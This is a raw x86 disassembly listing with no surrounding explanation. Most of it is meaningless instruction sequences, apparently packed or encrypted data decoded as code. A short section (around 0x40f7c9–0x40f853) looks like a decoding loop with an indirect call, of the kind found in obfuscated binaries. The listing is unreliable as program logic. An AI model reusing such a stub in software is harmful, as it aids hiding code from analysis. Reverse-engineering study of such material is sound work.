  40f294:	out    dx,eax
  40f295:	jae    0x40f2cd
  40f297:	fsubp  st(4),st
  40f299:	jo     0x40f2c2
  40f29b:	xchg   esp,eax
  40f29c:	and    DWORD PTR [ebx+ecx*8+0x6a70a0a5],ecx
  40f2a3:	fcmovu st,st(4)
  40f2a5:	cmp    BYTE PTR [edx],bh
  40f2a7:	ins    BYTE PTR es:[edi],dx
  40f2a8:	sub    eax,0x91f1460c
  40f2ad:	dec    ebp
  40f2ae:	ror    BYTE PTR [esi],1
  40f2b0:	std    
  40f2b1:	and    ebx,DWORD PTR [esi-0x3c]
  40f2b4:	lods   eax,DWORD PTR ds:[esi]
  40f2b5:	bound  esi,QWORD PTR [ebx+0x4e]
  40f2b8:	xor    BYTE PTR [edi-0x67],cl
  40f2bb:	sbb    ebx,ecx
  40f2bd:	fstsw  WORD PTR [ecx+ecx*1+0x3f088bd7]
  40f2c5:	jmp    0x40f335
  40f2c7:	xchg   esp,eax
  40f2c8:	dec    ebp
  40f2c9:	ss (bad) 
  40f2cb:	(bad)  
  40f2cc:	adc    eax,0xf0118e2d
  40f2d1:	clc    
  40f2d2:	cmc    
  40f2d3:	cmc    
  40f2d4:	dec    esp
  40f2d5:	cs xor eax,0x5c99bc6d
  40f2db:	es ja  0x40f2b6
  40f2de:	mov    al,0x1e
  40f2e0:	scas   eax,DWORD PTR es:[edi]
  40f2e1:	cmp    ch,bh
  40f2e3:	aaa    
  40f2e4:	push   ecx
  40f2e5:	jmp    0x7f53:0xa0eb11c5
  40f2ec:	test   DWORD PTR [edx+0x69],ebx
  40f2ef:	push   esi
  40f2f0:	push   ecx
  40f2f1:	push   ds
  40f2f2:	push   0xc
  40f2f4:	pop    edi
  40f2f5:	cmp    ebp,DWORD PTR ds:0x1cb176e
  40f2fb:	dec    edi
  40f2fc:	push   edi
  40f2fd:	mov    ds:0x61391f2f,eax
  40f302:	and    al,0x8c
  40f304:	mov    dh,0x27
  40f306:	mov    ds:0xb32d5ed4,eax
  40f30b:	das    
  40f30c:	outs   dx,BYTE PTR ds:[esi]
  40f30d:	pop    es
  40f30e:	ins    DWORD PTR es:[edi],dx
  40f30f:	shl    ecx,0xdc
  40f312:	dec    esi
  40f313:	pop    ss
  40f314:	lods   al,BYTE PTR ds:[esi]
  40f315:	icebp  
  40f316:	xchg   ecx,eax
  40f317:	pop    ebp
  40f318:	mov    eax,ds:0xe22b3516
  40f31d:	imul   ch
  40f31f:	sar    DWORD PTR [ecx+0x6bdc67d2],1
  40f325:	js     0x40f388
  40f327:	xchg   edx,eax
  40f328:	or     eax,0x29f4e7aa
  40f32d:	aaa    
  40f32e:	or     DWORD PTR [esi+0x34],edx
  40f331:	imul   BYTE PTR [ebp-0x139e0f25]
  40f337:	or     al,0x70
  40f339:	mov    esp,0x79dc5d7e
  40f33e:	inc    esi
  40f33f:	push   ecx
  40f340:	out    dx,al
  40f341:	add    BYTE PTR [edx],bh
  40f343:	std    
  40f344:	pop    edx
  40f345:	hlt    
  40f346:	rcr    esi,0xad
  40f349:	xor    eax,DWORD PTR [edx-0x4e]
  40f34c:	inc    ecx
  40f34d:	ja     0x40f392
  40f34f:	movd   DWORD PTR [esi+0x5],mm0
  40f353:	sub    BYTE PTR [bp+0x4b],dh
  40f357:	popf   
  40f358:	dec    ebp
  40f359:	jg     0x40f331
  40f35b:	sbb    cl,BYTE PTR [ecx+0x79]
  40f35e:	gs repnz adc al,dh
  40f362:	xor    ebx,DWORD PTR [edi-0x73a1b4c0]
  40f368:	popf   
  40f369:	(bad)  
  40f36a:	cs jmp 0xd1db:0xb3facea0
  40f372:	out    0x3b,al
  40f374:	cmp    DWORD PTR [ebp+ecx*1+0x7d],0x26a7423a
  40f37c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f37d:	daa    
  40f37e:	in     eax,0xbc
  40f380:	cmp    ch,dl
  40f382:	jle    0x40f38c
  40f384:	fild   WORD PTR [eax+0x11c88131]
  40f38a:	es retf 0xd856
  40f38e:	retf   0xe554
  40f391:	and    bh,BYTE PTR [ebp+0x22420d4d]
  40f397:	(bad)  
  40f398:	in     al,0xa4
  40f39a:	lods   eax,DWORD PTR ds:[esi]
  40f39b:	retf   
  40f39c:	or     DWORD PTR [ebx+0x626c6809],ebx
  40f3a2:	mov    esi,0x28fddff8
  40f3a7:	dec    ebx
  40f3a8:	mov    BYTE PTR [ebp-0x3a2f70a6],ch
  40f3ae:	dec    ebx
  40f3af:	push   ebp
  40f3b0:	pop    ds
  40f3b1:	inc    edx
  40f3b2:	ret    
  40f3b3:	mov    ebp,0xffe317a5
  40f3b8:	dec    esp
  40f3b9:	mov    ah,cl
  40f3bb:	xor    ah,al
  40f3bd:	stos   BYTE PTR es:[edi],al
  40f3be:	xchg   ebp,eax
  40f3bf:	inc    ecx
  40f3c0:	push   esp
  40f3c1:	aam    0x5c
  40f3c3:	mov    edi,0x55655d20
  40f3c8:	xchg   DWORD PTR [esi],eax
  40f3ca:	mov    bh,0xa1
  40f3cc:	push   edi
  40f3cd:	test   eax,0xc643b3b2
  40f3d2:	jne    0x40f371
  40f3d4:	aaa    
  40f3d5:	les    esp,FWORD PTR [eax+0x79]
  40f3d8:	cdq    
  40f3d9:	push   ds
  40f3da:	jb     0x40f3ce
  40f3dc:	in     eax,0x22
  40f3de:	push   ecx
  40f3df:	xor    ebp,edx
  40f3e1:	(bad)  
  40f3e2:	mov    esp,fs
  40f3e4:	mov    ah,0xba
  40f3e6:	mov    ds:0xb02c86ce,al
  40f3eb:	(bad)  
  40f3ec:	popa   
  40f3ed:	cli    
  40f3ee:	(bad)  
  40f3ef:	pop    edx
  40f3f0:	js     0x40f3ea
  40f3f2:	xchg   BYTE PTR [eax+0x21],dl
  40f3f5:	sar    BYTE PTR [eax+ecx*1+0x6968d5e4],cl
  40f3fc:	inc    esi
  40f3fd:	mov    cl,BYTE PTR [ecx-0x15]
  40f400:	mov    ds,WORD PTR [ebx+0x57]
  40f403:	and    ah,BYTE PTR [edi-0x5e]
  40f406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f407:	(bad)  
  40f408:	outs   dx,BYTE PTR ds:[esi]
  40f409:	nop
  40f40a:	mov    ds:0xaee58e14,eax
  40f40f:	test   al,0x2f
  40f411:	ss jl  0x40f3e4
  40f414:	out    dx,al
  40f415:	and    dl,dh
  40f417:	jl     0x40f48c
  40f419:	pop    es
  40f41a:	bound  ebp,QWORD PTR [ebx+esi*8-0x4678e591]
  40f421:	cmp    bh,BYTE PTR [edi+eiz*1]
  40f424:	cmp    DWORD PTR [esi+0x7347b458],0xdc75f652
  40f42e:	pop    esi
  40f42f:	inc    ebx
  40f430:	sbb    al,bh
  40f432:	(bad)  
  40f433:	psubsw mm4,QWORD PTR [esi+ecx*4-0x1a4c16a3]
  40f43b:	cdq    
  40f43c:	int    0x32
  40f43e:	push   eax
  40f43f:	jnp    0x40f41f
  40f441:	sahf   
  40f442:	fs jnp 0x40f4b4
  40f445:	fwait
  40f446:	push   es
  40f447:	outs   dx,BYTE PTR ds:[esi]
  40f448:	mov    WORD PTR [edi+0x6f1b3aff],es
  40f44e:	jmp    0x24bb62d7
  40f453:	adc    DWORD PTR [edi-0x4a],edx
  40f456:	inc    esi
  40f457:	mov    cl,BYTE PTR [eax-0x68]
  40f45a:	daa    
  40f45b:	xor    esi,DWORD PTR [edi]
  40f45d:	jecxz  0x40f413
  40f45f:	jp     0x40f43f
  40f461:	add    BYTE PTR [ebp+0x27],bl
  40f464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f465:	inc    edx
  40f466:	in     eax,0x67
  40f468:	(bad)  
  40f469:	je     0x40f41f
  40f46b:	cdq    
  40f46c:	das    
  40f46d:	push   ecx
  40f46e:	pop    ds
  40f46f:	loope  0x40f4b5
  40f471:	inc    esi
  40f472:	sub    ecx,DWORD PTR [edi+esi*1]
  40f475:	sub    al,0x1
  40f477:	in     eax,dx
  40f478:	jg     0x40f4f6
  40f47a:	cmc    
  40f47b:	test   eax,0x20aadf4
  40f480:	fmul   st(0),st
  40f482:	and    eax,DWORD PTR [edx-0x1c2ba5e8]
  40f488:	addr16 jl 0x40f4d1
  40f48b:	in     al,dx
  40f48c:	adc    esp,ebp
  40f48e:	or     ah,BYTE PTR [eax]
  40f490:	sub    ebx,esi
  40f492:	jo     0x40f45f
  40f494:	xlat   BYTE PTR ds:[ebx]
  40f495:	int3   
  40f496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f497:	sti    
  40f498:	sub    eax,0x1524e374
  40f49d:	mov    esi,0x7478eef6
  40f4a2:	jns    0x40f478
  40f4a4:	mov    cl,0x41
  40f4a6:	in     eax,dx
  40f4a7:	push   esi
  40f4a8:	fcom   QWORD PTR [ebp+0x0]
  40f4ab:	dec    eax
  40f4ac:	out    dx,al
  40f4ad:	loop   0x40f51e
  40f4af:	inc    ecx
  40f4b0:	adc    DWORD PTR [ecx+0x42fa99e2],esp
  40f4b6:	and    BYTE PTR [edx],0x2f
  40f4b9:	pop    edx
  40f4ba:	xor    al,0x34
  40f4bc:	jnp    0x40f443
  40f4be:	xchg   esi,eax
  40f4bf:	out    0xef,al
  40f4c1:	dec    edi
  40f4c2:	rol    ah,1
  40f4c4:	jne    0x40f51b
  40f4c6:	pop    edx
  40f4c7:	aaa    
  40f4c8:	(bad)  [ecx]
  40f4ca:	add    dh,BYTE PTR [edi+0x1]
  40f4cd:	repz push es
  40f4cf:	jmp    0xb45c:0x668ce219
  40f4d6:	sbb    eax,0xd63d6935
  40f4db:	lock idiv BYTE PTR [ecx-0x5]
  40f4df:	scas   eax,DWORD PTR es:[edi]
  40f4e0:	daa    
  40f4e1:	stos   BYTE PTR es:[edi],al
  40f4e2:	hlt    
  40f4e3:	sbb    bl,0xcc
  40f4e6:	mov    ah,BYTE PTR [eax]
  40f4e8:	hlt    
  40f4e9:	mov    eax,ecx
  40f4eb:	xor    dh,bl
  40f4ed:	inc    esi
  40f4ee:	jo     0x40f4d1
  40f4f0:	xchg   edx,eax
  40f4f1:	mov    ah,al
  40f4f3:	nop
  40f4f4:	loope  0x40f543
  40f4f6:	inc    eax
  40f4f7:	int    0xd2
  40f4f9:	adc    dl,BYTE PTR [edi+0x4640135d]
  40f4ff:	scas   al,BYTE PTR es:[edi]
  40f500:	bound  edi,QWORD PTR [ecx+0x988b91]
  40f506:	cmp    eax,0x6980c6ca
  40f50b:	imul   eax,esi,0x4a
  40f50e:	leave  
  40f50f:	inc    esp
  40f510:	dec    esi
  40f511:	dec    edi
  40f512:	jmp    0xfd0d:0x388ae3cc
  40f519:	aas    
  40f51a:	je     0x40f52c
  40f51c:	or     DWORD PTR [eax],ecx
  40f51e:	pop    esp
  40f51f:	jmp    0x40f4a2
  40f521:	pop    esp
  40f522:	(bad)  [esi]
  40f524:	add    ecx,ecx
  40f526:	inc    ebx
  40f527:	aad    0x35
  40f529:	test   BYTE PTR [esp+ecx*8+0x1d],dl
  40f52d:	or     eax,0x6c33c472
  40f532:	inc    DWORD PTR [edx-0x23]
  40f535:	frstor [esi+0x21]
  40f538:	jg     0x40f542
  40f53a:	push   0x6f
  40f53c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f53d:	cs ins BYTE PTR es:[edi],dx
  40f53f:	or     al,0xc2
  40f541:	cli    
  40f542:	(bad)  
  40f543:	clc    
  40f544:	mov    cl,0xb5
  40f546:	out    dx,eax
  40f547:	push   ebx
  40f548:	and    eax,0xe30569b0
  40f54d:	js     0x40f5c3
  40f54f:	shr    DWORD PTR [ebp+0x16],0x3e
  40f553:	xor    ebp,ebp
  40f555:	sbb    DWORD PTR [edx+0x527d0e47],ebp
  40f55b:	(bad)  
  40f55c:	ficom  WORD PTR [edi-0x1bc4253a]
  40f562:	in     al,dx
  40f563:	or     ecx,DWORD PTR [edx-0x2d424779]
  40f569:	sti    
  40f56a:	sbb    al,0xa0
  40f56c:	jle    0x40f512
  40f56e:	aas    
  40f56f:	fisttp DWORD PTR [ebx+0x4e]
  40f572:	dec    edi
  40f573:	jns    0x40f5eb
  40f575:	fistp  WORD PTR [edx]
  40f577:	cwde   
  40f578:	int    0xf2
  40f57a:	into   
  40f57b:	jmp    0x49c7:0x6ff6ce4f
  40f582:	gs push ecx
  40f584:	push   ebp
  40f585:	inc    edx
  40f586:	dec    ebx
  40f587:	mov    ebp,0x76d5510e
  40f58c:	inc    eax
  40f58d:	aaa    
  40f58e:	repz add eax,0x29a7ba22
  40f594:	mov    esp,0xc479a799
  40f599:	cmp    al,0xe4
  40f59b:	jmp    0xc250fc41
  40f5a0:	push   es
  40f5a1:	call   0x1e04e86d
  40f5a6:	ret    
  40f5a7:	adc    ecx,DWORD PTR [esi+eiz*8+0x11]
  40f5ab:	adc    bh,BYTE PTR ds:0xf631e092
  40f5b1:	xchg   ecx,eax
  40f5b2:	mov    edi,0xa2c8154f
  40f5b7:	fimul  DWORD PTR [edx]
  40f5b9:	jmp    0x6d90c404
  40f5be:	enter  0xb089,0x19
  40f5c2:	push   edx
  40f5c3:	sbb    eax,DWORD PTR [esi-0x3a]
  40f5c6:	icebp  
  40f5c7:	pop    ebp
  40f5c8:	pop    ebp
  40f5c9:	gs cmp eax,0x2713e75a
  40f5cf:	xor    eax,0x6ae19a6b
  40f5d4:	neg    al
  40f5d6:	arpl   WORD PTR [esi+edx*8-0x17],si
  40f5da:	jne    0x40f62d
  40f5dc:	jle    0x40f5ef
  40f5de:	mov    ebp,0xcf687080
  40f5e3:	stc    
  40f5e4:	icebp  
  40f5e5:	pop    edx
  40f5e6:	jle    0x40f613
  40f5e8:	jle    0x40f5ec
  40f5ea:	mov    dl,0xea
  40f5ec:	inc    esp
  40f5ed:	mov    ebp,0x38ed561b
  40f5f2:	xchg   BYTE PTR [ebp+0x4a],cl
  40f5f5:	fs leave 
  40f5f7:	loopne 0x40f594
  40f5f9:	scas   al,BYTE PTR es:[edi]
  40f5fa:	scas   eax,DWORD PTR es:[edi]
  40f5fb:	scas   eax,DWORD PTR es:[edi]
  40f5fc:	in     eax,dx
  40f5fd:	aad    0x53
  40f5ff:	xchg   edx,eax
  40f600:	inc    esp
  40f601:	bound  ecx,QWORD PTR [edx+0x74]
  40f604:	xor    DWORD PTR [ecx-0x2c9b43ea],0x567abb70
  40f60e:	mov    ch,0x70
  40f610:	xchg   edx,eax
  40f611:	inc    esi
  40f612:	in     eax,dx
  40f613:	sub    DWORD PTR [edx+eax*8],esp
  40f616:	(bad)  [ebp-0x48]
  40f619:	fist   DWORD PTR [eax]
  40f61b:	jg     0x40f5ba
  40f61d:	fsubr  st,st(3)
  40f61f:	fst    QWORD PTR [ebp-0x2c]
  40f622:	mov    edi,0xee7db7fc
  40f627:	mov    ecx,0x65f04e41
  40f62c:	clc    
  40f62d:	clc    
  40f62e:	dec    esi
  40f62f:	jb     0x40f62e
  40f631:	ins    BYTE PTR es:[edi],dx
  40f632:	sub    DWORD PTR [edx],ecx
  40f634:	and    al,0x48
  40f636:	dec    eax
  40f637:	lock ror ebp,0xb0
  40f63b:	and    eax,0xa324a0bd
  40f640:	xchg   ebx,ecx
  40f642:	minps  xmm5,XMMWORD PTR [eax+0x72]
  40f646:	pop    ebx
  40f647:	inc    ecx
  40f648:	sbb    BYTE PTR [esi],0x36
  40f64b:	and    al,0x4b
  40f64d:	(bad)  
  40f64e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40f650:	addr16 ss adc cl,bl
  40f654:	pop    ebx
  40f655:	stos   DWORD PTR es:[edi],eax
  40f656:	jmp    DWORD PTR [ecx-0x6e]
  40f659:	leave  
  40f65a:	and    BYTE PTR [edx+ebx*8-0x649e5078],bh
  40f661:	js     0x40f5e8
  40f663:	shl    bl,cl
  40f665:	dec    ebp
  40f666:	mov    esp,0x8554b078
  40f66b:	pop    esi
  40f66c:	push   edx
  40f66d:	sti    
  40f66e:	fstp   TBYTE PTR [ecx+0x3b]
  40f671:	into   
  40f672:	jg     0x40f696
  40f674:	adc    al,0xb4
  40f676:	rol    BYTE PTR [ebp-0x38],cl
  40f679:	imul   esi,DWORD PTR [esi+0xf8872c1],0x272ca626
  40f683:	and    dh,dl
  40f685:	xor    al,0x83
  40f687:	dec    ebx
  40f688:	lea    edx,[eax-0x1]
  40f68b:	sub    al,0x9e
  40f68d:	mov    edi,0xf05172d4
  40f692:	mov    ds:0xdde57a4d,al
  40f697:	jl     0x40f654
  40f699:	or     eax,0xe415b63b
  40f69e:	mov    ecx,ds
  40f6a0:	fwait
  40f6a1:	cmp    DWORD PTR [edx+0x1aa7065b],0xffffff95
  40f6a8:	std    
  40f6a9:	xor    ecx,DWORD PTR [ecx+0x3155a08f]
  40f6af:	cdq    
  40f6b0:	dec    edi
  40f6b1:	or     eax,0xf31432cb
  40f6b6:	sub    al,0x72
  40f6b8:	ja     0x40f673
  40f6ba:	aam    0x5a
  40f6bc:	inc    ebx
  40f6bd:	lods   eax,DWORD PTR ds:[esi]
  40f6be:	shr    eax,0xc5
  40f6c1:	sbb    al,0x30
  40f6c3:	xchg   ebp,eax
  40f6c4:	dec    edx
  40f6c5:	sbb    ecx,DWORD PTR [ecx+edi*4]
  40f6c8:	mov    bh,0x25
  40f6ca:	xor    al,0xec
  40f6cc:	sub    edx,DWORD PTR [eax+0x3e]
  40f6cf:	(bad)  
  40f6d0:	test   al,0x30
  40f6d2:	xchg   DWORD PTR [esi+0x68],edi
  40f6d5:	adc    al,0xd4
  40f6d7:	mov    ds:0xfb55c77b,eax
  40f6dc:	daa    
  40f6dd:	nop
  40f6de:	hlt    
  40f6df:	fstp   DWORD PTR [edi-0x59]
  40f6e2:	inc    ecx
  40f6e3:	ja     0x40f697
  40f6e5:	jle    0x40f735
  40f6e7:	(bad)  
  40f6e9:	call   0x8328:0xbfdd8b79
  40f6f0:	mov    esi,0x6f5c33bf
  40f6f5:	clc    
  40f6f6:	sbb    al,0xf5
  40f6f8:	in     eax,0xe3
  40f6fa:	rol    esp,0xe7
  40f6fd:	mov    ah,0xc5
  40f6ff:	push   0xe387d8f3
  40f704:	aas    
  40f705:	jmp    0x760d:0xf499ce6f
  40f70c:	mov    ds:0xe3e9727b,al
  40f711:	rol    BYTE PTR [ebp+ebx*4-0x71dce95c],cl
  40f718:	mov    ds:0xbed45562,al
  40f71d:	push   cs
  40f71e:	mov    dh,0x36
  40f720:	mov    bl,0x57
  40f722:	pop    ds
  40f723:	or     dh,BYTE PTR [esi+0x1bfdbb34]
  40f729:	and    bh,bl
  40f72b:	(bad)  
  40f72c:	shr    edi,1
  40f72e:	jmp    0x771e8cfc
  40f733:	and    ecx,edi
  40f735:	aam    0x8b
  40f737:	outs   dx,BYTE PTR ds:[esi]
  40f738:	xor    bh,bl
  40f73a:	sti    
  40f73b:	ret    
  40f73c:	call   0xa089b507
  40f741:	leave  
  40f742:	mov    bh,0xfe
  40f744:	pop    edx
  40f745:	pop    esp
  40f746:	mov    edx,0xe15f2e32
  40f74b:	out    dx,eax
  40f74c:	add    eax,0x76a0bf9b
  40f751:	leave  
  40f752:	lock push 0xd9de5732
  40f758:	pop    ecx
  40f759:	sbb    dh,BYTE PTR [ebx+0x3d72a4e8]
  40f75f:	int3   
  40f760:	xchg   ecx,eax
  40f761:	or     BYTE PTR [eax+ecx*4-0x60],bh
  40f765:	push   ecx
  40f766:	mov    ebp,DWORD PTR [ebp-0xd]
  40f769:	pushf  
  40f76a:	inc    esi
  40f76b:	jl     0x40f764
  40f76d:	mov    bl,BYTE PTR [ecx+0x3ec1979d]
  40f773:	inc    edi
  40f774:	jle    0x40f7ee
  40f776:	fisttp DWORD PTR [ecx-0x267cca06]
  40f77c:	fistp  WORD PTR [edi+esi*2+0xa417570]
  40f783:	push   cs
  40f784:	(bad)  
  40f785:	sub    eax,0xd1b7dc50
  40f78a:	inc    edi
  40f78b:	dec    ebx
  40f78c:	test   eax,0xbfbb1f61
  40f791:	pushf  
  40f792:	int3   
  40f793:	and    ebx,DWORD PTR [edx+0x42]
  40f796:	jl     0x40f74c
  40f798:	pop    ebp
  40f799:	xor    ch,BYTE PTR [esi-0x1c]
  40f79c:	test   DWORD PTR [ebp+0x3c],ebp
  40f79f:	inc    edx
  40f7a0:	push   0x74
  40f7a2:	and    DWORD PTR [edx+esi*1-0x18],ebx
  40f7a6:	xchg   ecx,eax
  40f7a7:	in     al,0x9
  40f7a9:	mov    esi,0x937be0fe
  40f7ae:	ins    BYTE PTR es:[edi],dx
  40f7af:	jge    0x40f812
  40f7b1:	(bad)  
  40f7b2:	pop    ebp
  40f7b3:	sbb    DWORD PTR es:[ecx-0x35],ebp
  40f7b7:	xor    bh,BYTE PTR ss:[ebp+0x3f408b02]
  40f7be:	das    
  40f7bf:	jge    0x40f7af
  40f7c1:	sbb    eax,DWORD PTR [edi-0x468e45e0]
  40f7c7:	mov    bl,0x8
  40f7c9:	push   ecx
  40f7ca:	pop    es
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0xab6ec04a
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	outs   dx,DWORD PTR ds:[esi]
  40f871:	ins    BYTE PTR es:[edi],dx
  40f872:	jmp    0x4b02:0x2cd882da
  40f879:	sbb    eax,0xd9b31c
  40f87e:	loopne 0x40f89b
  40f880:	ins    BYTE PTR es:[edi],dx
  40f881:	or     BYTE PTR [eax-0x605f22db],cl
  40f887:	xchg   edx,eax
  40f888:	mov    ebp,0x9e03feba
  40f88d:	xchg   esp,eax
  40f88e:	pop    eax
  40f88f:	adc    eax,0xe489e830
  40f894:	popf   
  40f895:	ret    
  40f896:	push   eax
  40f897:	imul   eax,edi,0xffffffe5
  40f89a:	jmp    0x40f865
  40f89c:	arpl   WORD PTR [ecx],bp
  40f89e:	out    0x19,al
  40f8a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8a1:	lods   al,BYTE PTR ds:[esi]
  40f8a2:	or     eax,0xc29841f
  40f8a7:	dec    eax
  40f8a8:	inc    ecx
  40f8a9:	mov    dh,0xcf
  40f8ab:	add    bl,BYTE PTR [ebx+0x6e]
  40f8ae:	push   esp
  40f8b0:	jno    0x40f930
  40f8b2:	push   edi
  40f8b3:	jmp    0x40f8d1
  40f8b5:	xchg   esp,eax
  40f8b6:	std    
  40f8b7:	in     eax,0x67
  40f8b9:	call   0x89b:0xfa577372
  40f8c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8c1:	inc    ecx
  40f8c2:	mov    gs,WORD PTR [bx]
  40f8c5:	fwait
  40f8c6:	push   ds
  40f8c7:	push   0x2f7a6fcd
  40f8cc:	lods   eax,DWORD PTR ds:[esi]
  40f8cd:	fsub   QWORD PTR [ebp+eiz*2-0x7f388382]
  40f8d4:	jmp    0x5d1bc0a0
  40f8d9:	mov    ebp,0xb93c1a97
  40f8de:	fbstp  TBYTE PTR [ebp+0x190e886c]
  40f8e4:	pusha  
  40f8e5:	jae    0x40f8e1
  40f8e7:	xchg   esi,eax
  40f8e8:	div    DWORD PTR [edi]
  40f8ea:	pop    ebp
  40f8eb:	xchg   edx,eax
  40f8ec:	and    edx,DWORD PTR [eax]
  40f8ee:	push   0x7
  40f8f0:	mov    DWORD PTR cs:[edx],esi
  40f8f3:	call   0x30fa29c5
  40f8f8:	pop    esp
  40f8f9:	pop    edx
  40f8fa:	jmp    0x4b0d6456
  40f8ff:	test   dh,0xfc
  40f902:	inc    edi
  40f903:	add    dl,ch
  40f905:	and    DWORD PTR [ebp+0x43735d39],eax
  40f90b:	jo     0x40f97e
  40f90d:	rcl    BYTE PTR [eax],cl
  40f90f:	inc    esp
  40f910:	pop    ecx
  40f911:	mov    al,0x82
  40f913:	aam    0x6
  40f915:	into   
  40f916:	lods   al,BYTE PTR ds:[esi]
  40f917:	enter  0x1e76,0x54
  40f91b:	adc    edi,ecx
  40f91d:	jne    0x40f8aa
  40f91f:	xchg   ebp,eax
  40f920:	mov    ecx,0x62bdaa17
  40f925:	push   0x519b08d8
  40f92a:	call   0x1aca:0x81ce4f58
  40f931:	xchg   ecx,eax
  40f932:	sub    DWORD PTR [eax],esp
  40f934:	mov    bh,0x8d
  40f936:	dec    esi
  40f937:	in     eax,0x6
  40f939:	scas   al,BYTE PTR es:[edi]
  40f93a:	lds    edx,FWORD PTR ss:[ecx]
  40f93d:	or     eax,0x19de6c0b
  40f942:	add    BYTE PTR [ebp+0x54],0xeb
  40f946:	sbb    DWORD PTR [eax-0x40bd57ed],0xffffffae
  40f94d:	push   esi
  40f94e:	loop   0x40f8df
  40f950:	jo     0x40f8d7
  40f952:	add    al,BYTE PTR [ecx+0x7c]
  40f955:	cs mov esi,0x5f8bcae5
  40f95b:	jne    0x40f939
  40f95d:	fs mov ebp,0xb2fbc773
  40f963:	int3   
  40f964:	jbe    0x40f98a
  40f966:	or     ah,BYTE PTR [ecx]
  40f968:	in     al,dx
  40f969:	jmp    0x6bdc:0x9f274a6c
  40f970:	adc    eax,0x3ff7fd32
  40f975:	jne    0x40f952
  40f977:	xor    cl,ch
  40f979:	popa   
  40f97a:	push   edx
  40f97b:	loope  0x40f9f1
  40f97d:	xlat   BYTE PTR ds:[ebx]
  40f97e:	pop    ebp
  40f97f:	sbb    ch,BYTE PTR [eax]
  40f981:	aad    0xa2
  40f983:	and    edi,DWORD PTR [ecx+0x7f]
  40f986:	ins    BYTE PTR es:[edi],dx
  40f987:	sbb    bl,bh
  40f989:	and    bl,BYTE PTR [ecx-0x1d]
  40f98c:	rcr    ebx,1
  40f98e:	jecxz  0x40f97a
  40f990:	push   ds
  40f991:	jg     0x40f99b
  40f993:	push   cx
  40f995:	mov    ebx,0x7900e081
  40f99a:	push   ebx
  40f99b:	and    DWORD PTR [eax+0x2e9df1da],edx
  40f9a1:	push   ecx
  40f9a2:	adc    ebx,0xcb1a9499
  40f9a8:	push   ds
  40f9a9:	mov    dl,0xe1
  40f9ab:	nop
  40f9ac:	call   0xc83c37ec
  40f9b1:	mov    al,0x32
  40f9b3:	fsubr  st(6),st
  40f9b5:	and    eax,DWORD PTR [ebp-0x68]
  40f9b8:	mov    ds:0xa7a86e97,eax
  40f9bd:	scas   eax,DWORD PTR es:[edi]
  40f9be:	pop    ss
  40f9bf:	test   BYTE PTR ds:0x675bd96d,0xd3
  40f9c6:	add    DWORD PTR [ebx+0x4c],0x281906c5
  40f9cd:	xor    eax,0xd8565f09
  40f9d2:	pop    edi
  40f9d3:	sbb    al,0x97
  40f9d5:	int    0x75
  40f9d7:	das    
  40f9d8:	shr    DWORD PTR fs:[ebp-0x1ab1232a],cl
  40f9df:	ficomp WORD PTR [ebx]
  40f9e1:	out    0xc,al
  40f9e3:	cmc    
  40f9e4:	mov    dl,0x2c
  40f9e6:	loope  0x40f9a8
  40f9e8:	adc    eax,0xd34c2c17
  40f9ed:	hlt    
  40f9ee:	xor    dh,BYTE PTR [edx+eiz*2]
  40f9f1:	jo     0x40f977
  40f9f3:	enter  0xfe26,0xa5
  40f9f7:	popa   
  40f9f8:	jp     0x40fa41
  40f9fa:	mov    al,0xcc
  40f9fc:	push   ecx
  40f9fd:	add    cl,BYTE PTR [edx]
  40f9ff:	mov    bl,0x79
  40fa01:	retf   
  40fa02:	dec    ebp
  40fa03:	jmp    0x40f9d7
  40fa05:	sti    
  40fa06:	rcr    BYTE PTR [ecx+ecx*1+0xc],0xc5
  40fa0b:	jae    0x40f9c7
  40fa0d:	sbb    DWORD PTR [esi+0x6],eax
  40fa10:	mov    bl,0x19
  40fa12:	and    BYTE PTR [esi],bh
  40fa14:	cmp    eax,0xd7179299
  40fa19:	ret    0x3659
  40fa1c:	(bad)  
  40fa1d:	mov    ebp,0xd6552c14
  40fa22:	jb     0x40f9a5
  40fa24:	mov    edx,0x7b45a31
  40fa29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa2a:	repz push ss
  40fa2c:	stos   BYTE PTR es:[edi],al
  40fa2d:	loope  0x40fa39
  40fa2f:	out    0xea,eax
  40fa31:	inc    esp
  40fa32:	jp     0x40fa87
  40fa34:	pop    esp
  40fa35:	dec    esp
